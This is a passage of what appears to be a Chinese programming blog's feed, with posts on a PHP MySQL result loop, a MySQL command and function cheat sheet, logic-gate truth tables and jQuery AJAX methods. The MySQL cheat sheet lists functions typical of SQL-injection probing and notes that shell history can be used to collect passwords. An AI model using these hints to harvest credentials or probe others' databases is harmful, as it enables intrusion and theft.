class="variable">$result</span>,MYSQL_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;title:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;date:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;date&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;txet:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;txt&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为条件不一样，后者每次循环先执行函数，然后将值赋予变量，然后指针后移，每次取的数据都是下一条，到最后一条数据执行完，返回的是假，所以执行完最后一条就退出循环,相当于是foreach循环,跑完了就跳出循环。而第一个，的条件是一个变量，这个变量是固定的值.</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;错误代码&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    
    <category term="编程" scheme="https://bstark.me/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>mysql语句基础</title>
    <link href="https://bstark.me/posts/49263/"/>
    <id>https://bstark.me/posts/49263/</id>
    <published>2022-01-08T02:54:52.000Z</published>
    <updated>2022-01-20T14:16:23.814Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mariadb  <span class="comment">#启动MariaDB</span></span><br><span class="line">systemctl stop mariadb  <span class="comment">#停止MariaDB</span></span><br><span class="line">systemctl restart mariadb  <span class="comment">#重启MariaDB</span></span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb  <span class="comment">#设置开机启动</span></span><br><span class="line">mysql_cecure_installation //初始化</span><br><span class="line">mysql -h host_name -uroot -proot  <span class="comment">#-h可为ip或者主机名  扩展：history 可收集密码</span></span><br><span class="line">show databases;     <span class="comment">#显示所有数据库</span></span><br><span class="line">use dbname;    <span class="comment">#选定默认数据库</span></span><br><span class="line">show tables;     <span class="comment">#显示默认数据的所有表</span></span><br><span class="line">desc 表名；       <span class="comment">#显示表结构属性</span></span><br><span class="line">show columns from user <span class="comment">#显示表结构属性</span></span><br><span class="line">create database 数据库名;  <span class="comment">#创建数据库</span></span><br><span class="line">drop database 数据库名;  <span class="comment">#删除数据库</span></span><br><span class="line">drop table <span class="built_in">test</span>； <span class="comment">#删除表</span></span><br><span class="line">use 数据库名;  <span class="comment">#选择数据库</span></span><br><span class="line">mysql <span class="keyword">function</span></span><br><span class="line">database()  <span class="comment">#当前库名</span></span><br><span class="line">version()  <span class="comment">#数据库版本信息</span></span><br><span class="line">user()   <span class="comment">#连接数据库用户的信息</span></span><br><span class="line">@@datadir    <span class="comment">#数据库数据的绝对路径</span></span><br><span class="line">@@basedir   <span class="comment">#数据库文件的绝对路径</span></span><br><span class="line">@@version_compile_os  <span class="comment">#操作系统版本</span></span><br><span class="line">extractvalue/updatexml 更新xml文档</span><br><span class="line">sleep/benchmark  <span class="comment">#休眠时间/性能测试</span></span><br><span class="line"><span class="keyword">if</span>(arg1,arg2,arg3)  <span class="comment">#条件判断</span></span><br><span class="line">ascii <span class="comment">#返回字符的ascii码</span></span><br><span class="line">char    <span class="comment">#从ascii码还原为字符(串)</span></span><br><span class="line">substr/substring/mid  <span class="comment">#截取字符串</span></span><br><span class="line">password     <span class="comment">#mysql5 shal加密明文</span></span><br><span class="line">hex     <span class="comment">#转换为16进制</span></span><br><span class="line">/etc/my.cnf  <span class="comment">#数据库配置文件</span></span><br><span class="line">\c     <span class="comment">#放弃正在输入的命令</span></span><br><span class="line">\h     <span class="comment">#显示命令清单</span></span><br><span class="line">\q     <span class="comment">#退出mysql程序</span></span><br><span class="line">\s     <span class="comment">#查看mysql服务器状态信息</span></span><br></pre></td></tr></table></figure><h2 id="常用数据类型"><a href="#常用数据类型" class="headerlink" title="常用数据类型"></a>常用数据类型</h2><table><thead><tr><th>名称</th><th>类型</th><th>范围</th><th>用途</th></tr></thead><tbody><tr><td>int</td><td>整数型</td><td>(0，4 294 967 295)</td><td>大整数</td></tr><tr><td>float</td><td>浮点型</td><td>很小</td><td>浮点小数</td></tr><tr><td>datetime</td><td>时间型</td><td>YYYY-MM-DD/ HH:MM:SS</td><td>日期/时间</td></tr><tr><td>text</td><td>文本型</td><td>0-65535 bytes</td><td>长文本数据只能默认值为空</td></tr><tr><td>varchar</td><td>字符串</td><td>0-65535 bytes</td><td>变长字符串可有默认值</td></tr></tbody></table><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><ul><li><strong>创建语句</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名 (列名<span class="number">1</span> 类型<span class="number">1</span> <span class="keyword">not</span> <span class="keyword">null</span> auto_increment <span class="keyword">primary</span> key，列名<span class="number">2</span> 类型<span class="number">2</span>)；</span><br></pre></td></tr></table></figure></li><li><strong>表结构操作</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">修改表名：</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info rename <span class="keyword">as</span> info2；</span><br><span class="line">修改字段：</span><br><span class="line">添加一个字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">add</span> username <span class="type">varchar</span>(<span class="number">255</span>);</span><br><span class="line">删除一个字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">drop</span> username；</span><br><span class="line">更改字段类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info modify col_name data_type</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info modify sex <span class="type">varchar</span>(<span class="number">3</span>);</span><br><span class="line">更改字段名字</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info change col_name1 col_name2 data_type</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info change sex sexy <span class="type">char</span>(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>插入语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name ( 字段<span class="number">1</span>, 字段<span class="number">2</span>,...字段N )</span><br><span class="line">                       <span class="keyword">VALUES</span></span><br><span class="line">                       ( value1, value2,...valueN ),(<span class="keyword">value</span>，<span class="keyword">value</span>);</span><br></pre></td></tr></table></figure><p>ps:如果数据是字符型，必须使用单引号或者双引号，如：”value”.</p><ul><li><p><strong>查询数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>(上级库).admin（表） <span class="operator">/</span><span class="operator">/</span>跨库查询</span><br><span class="line"><span class="keyword">select</span>  字段<span class="number">1</span>，字段<span class="number">2</span>，字段<span class="number">3</span>，字段N <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure></li><li><p><strong>where语句</strong></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">WHERE</span> runoob_author<span class="operator">=</span><span class="string">&#x27;菜鸟教程 ;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN <span class="keyword">FROM</span> table_name1, table_name2...</span><br><span class="line">[<span class="keyword">WHERE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] condition2.....  #field1先选定 要输出显示的列 <span class="operator">+</span> 表名 <span class="operator">+</span> <span class="keyword">where</span> 条件 <span class="operator">+</span> <span class="keyword">and</span> <span class="keyword">or</span> 条件.  <span class="keyword">DELETE</span> UPDATE可用</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        <span class="keyword">FROM</span> runoob_tbl</span><br><span class="line">        <span class="keyword">WHERE</span> runoob_author<span class="operator">=</span>&quot;RUNOOB.COM&quot;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><strong>update语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名 <span class="keyword">SET</span>  字段<span class="number">1</span><span class="operator">=</span><span class="keyword">new</span><span class="operator">-</span><span class="keyword">value</span>, 字段<span class="number">2</span><span class="operator">=</span><span class="keyword">new</span><span class="operator">-</span>value2</span><br><span class="line"><span class="keyword">WHERE</span> 一个条件或多个条件。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE runoob_tbl <span class="keyword">SET</span> runoob_title<span class="operator">=</span><span class="string">&#x27;学习 C++&#x27;</span> <span class="keyword">WHERE</span> runoob_id<span class="operator">=</span><span class="number">3</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>delete语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件  </span><br></pre></td></tr></table></figure><ul><li><strong>LIKE 子句</strong></li></ul><p>不能单独使用,需要配合where使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span>   </span><br><span class="line">update <span class="keyword">FROM</span> 表 <span class="keyword">SET</span> 一个字段<span class="operator">=</span><span class="keyword">value</span>, <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span>  </span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span> </span><br></pre></td></tr></table></figure><ul><li> <strong>union语句</strong></li></ul><p>UNION 语句：用于将不同表中相同列中查询的数据展示出来；（不包括重复数据）</p><p>UNION ALL 语句：用于将不同表中相同列中查询的数据展示出来；（包括重复数据）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名称；</span><br><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名称；</span><br></pre></td></tr></table></figure><ul><li><strong>排序</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> submission_date <span class="keyword">ASC</span>;    <span class="operator">/</span>升序</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> submission_date <span class="keyword">DESC</span>;   <span class="operator">/</span>降序</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;&gt;&lt;/a&gt;基本操作&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    
    <category term="数据库" scheme="https://bstark.me/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>与、或、非、与非、或非、异或、同或</title>
    <link href="https://bstark.me/posts/49591/"/>
    <id>https://bstark.me/posts/49591/</id>
    <published>2022-01-03T11:04:52.000Z</published>
    <updated>2022-01-08T15:54:29.802Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">与：and &amp;&amp; -&gt;逻辑乘法 有<span class="number">0</span>出<span class="number">0</span>；全<span class="number">1</span>出<span class="number">1</span> 例：<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span>,<span class="number">11</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">或：or  || -&gt;逻辑加法 有<span class="number">1</span>出<span class="number">1</span>，全<span class="number">0</span>出<span class="number">0</span> 例：<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">非：not !  -&gt;逻辑否定 有<span class="number">1</span>出<span class="number">0</span>，有<span class="number">0</span>出<span class="number">1</span> 取相反值</span><br><span class="line"></span><br><span class="line">与非：nand-&gt;先按与的操作，然后结果取反 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">或非：nor-&gt;先按或的操作，然后结果取反 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">异或：xor-&gt;相同得<span class="number">0</span>;相异得<span class="number">1</span> 例:<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">同或：xnor-&gt;相同得<span class="number">1</span>;相异得<span class="number">0</span> 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span> <span class="number">11</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>首先记住与、或、非。与非、或非只需要先按照与、或判断，再非一下。异或、与或关键词在于《异：不同》为1、《与：相同》为1。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l</summary>
      
    
    
    
    
    <category term="编程" scheme="https://bstark.me/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>jquery ajax及XMLHttpRequest常用方法</title>
    <link href="https://bstark.me/posts/2353/"/>
    <id>https://bstark.me/posts/2353/</id>
    <published>2022-01-01T10:00:00.000Z</published>
    <updated>2022-01-01T10:22:43.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="jquery基础操作"><a href="#jquery基础操作" class="headerlink" title="jquery基础操作"></a>jquery基础操作</h2><h3 id="三种选择器"><a href="#三种选择器" class="headerlink" title="三种选择器"></a>三种选择器</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>)      <span class="comment">//元素选择器 </span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>)<span class="comment">//id选择器</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;.test&quot;</span>)  <span class="comment">//class选择器</span></span><br></pre></td></tr></table></figure><h3 id="事件方法"><a href="#事件方法" class="headerlink" title="事件方法"></a>事件方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).click();<span class="comment">//点击事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).dblclick();  <span class="comment">//双击事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).mouseenter(); <span class="comment">//鼠标移动事件</span></span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).(<span class="built_in">document</span>).ready() <span class="comment">//页面加载完后执行事件</span></span><br></pre></td></tr></table></figure><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><h3 id="获得内容-text-、html-以及-val"><a href="#获得内容-text-、html-以及-val" class="headerlink" title="获得内容 - text()、html() 以及 val()"></a>获得内容 - text()、html() 以及 val()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#test&quot;</span>).text()  <span class="comment">//获得id元素text内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).html()  <span class="comment">//获得id元素html内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).val()   <span class="comment">////获得id元素value内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test&quot;</span>).attr(<span class="string">&quot;href&quot;</span>) <span class="comment">//获得id元素href属性值</span></span><br></pre></td></tr></table></figure><h3 id="设置内容-text-、html-以及-val"><a href="#设置内容-text-、html-以及-val" class="headerlink" title="设置内容 - text()、html() 以及 val()"></a>设置内容 - text()、html() 以及 val()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#test1&quot;</span>).text(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test2&quot;</span>).html(<span class="string">&quot;&lt;b&gt;Hello world!&lt;/b&gt;&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test3&quot;</span>).val(<span class="string">&quot;value666&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;#test4&quot;</span>).attr(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;http://baidu.com&quot;</span>);<span class="comment">//可设置多个值，逗号分开 </span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#test1&quot;</span>).text(<span class="function"><span class="keyword">function</span>(<span class="params">i,origText</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;旧 html: &quot;</span> + origText + <span class="string">&quot; 新 html&quot;</span>;</span><br><span class="line">&#125;);      <span class="comment">//回调函数传参旧值+新值</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;#test4&quot;</span>).attr(<span class="string">&quot;href&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">i,origValue</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> origValue + <span class="string">&quot;/jquery&quot;</span>; </span><br><span class="line">  &#125;);     <span class="comment">//回调函数传参旧值+新值</span></span><br></pre></td></tr></table></figure><h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;p&quot;</span>).append(<span class="string">&quot;追加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;p&quot;</span>).prepend(<span class="string">&quot;在开头追加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;body&quot;</span>).append(txt1,txt2,txt3); <span class="comment">//定义变量，批量添加</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).after(<span class="string">&quot;在后面添加文本&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).before(<span class="string">&quot;在前面添加文本&quot;</span>); </span><br><span class="line">$(<span class="string">&quot;img&quot;</span>).after(txt1,txt2,txt3);  <span class="comment">//定义变量，批量添加</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#div1&quot;</span>).remove();   <span class="comment">//删除div1整个元素</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).empty();    <span class="comment">//删除div1下属的子元素</span></span><br></pre></td></tr></table></figure><h2 id="jQuery-AJAX-常用方法"><a href="#jQuery-AJAX-常用方法" class="headerlink" title="jQuery AJAX 常用方法"></a>jQuery AJAX 常用方法</h2><h3 id="ajax"><a href="#ajax" class="headerlink" title="$.ajax()"></a>$.ajax()</h3><p>JQuery原生的ajax编写格式，具有多个参数来设置相关的操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line"><span class="attr">url</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//异步请求访问链接</span></span><br><span class="line"><span class="attr">data</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//提交的数据，将自动转换为请求字符串格式</span></span><br><span class="line"><span class="attr">dataType</span>:<span class="string">&quot;&quot;</span>,<span class="comment">//json,xml,text,html等</span></span><br><span class="line"><span class="attr">type</span>:<span class="string">&quot;post&quot;</span>,<span class="comment">//默认值: &quot;GET&quot;。请求方式 (&quot;POST&quot; 或 &quot;GET&quot;)</span></span><br><span class="line"><span class="attr">async</span>:<span class="literal">true</span>,<span class="comment">//默认为true，即默认为异步请求，否则为同步请求</span></span><br><span class="line"><span class="attr">contentType</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,<span class="comment">//默认值为application/x-www-form-urlencoded，即表单提交的方式，可以切换为&quot;application/json&quot;</span></span><br><span class="line"><span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line"><span class="comment">//当异步请求完成时所执行的回调函数</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="get-和-post-方法"><a href="#get-和-post-方法" class="headerlink" title="get() 和 post() 方法"></a>get() 和 post() 方法</h3><p>$.get(<em>URL</em>,<em>callback</em>);</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">&quot;http://www.b.com/test.php?url=11&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data,status</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">&quot;数据:&quot;</span> + data + <span class="string">&quot;状态:&quot;</span> + status);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>$.post(URL,data,callback);</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.post(<span class="string">&quot;http://www.b.com/post.php&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&quot;dome&quot;</span>,</span><br><span class="line">        <span class="attr">key</span>:<span class="string">&quot;ccc&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">data,status</span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">&quot;数据:&quot;</span> + data + <span class="string">&quot;状态:&quot;</span> + status);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="getScript"><a href="#getScript" class="headerlink" title="$.getScript()"></a>$.getScript()</h3><p>使用 AJAX 的 HTTP GET 请求获取和执行 JavaScrip,可选参数url,success(response,status)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;button&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.getScript(<span class="string">&quot;demo_ajax_script.js&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load()"></a>load()</h3><p>把test.txt内容加载到指定的 <div> 元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(url,data,callback);  </span><br><span class="line"><span class="comment">//callback函数参数1：responseTxt(结果) 参数2：statusTXT(状态) xhr：xhr 对象</span></span><br><span class="line"><span class="comment">// eg : function(responseTxt,statusTxt,xhr)</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;test.txt&quot;</span>);   <span class="comment">//内容加载到指定的 &lt;div&gt; 元素中</span></span><br><span class="line">$(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;test.txt #p1&quot;</span>); <span class="comment">//test.txt文件中 id=&quot;p1&quot; 的元素的内容，加载到指定的 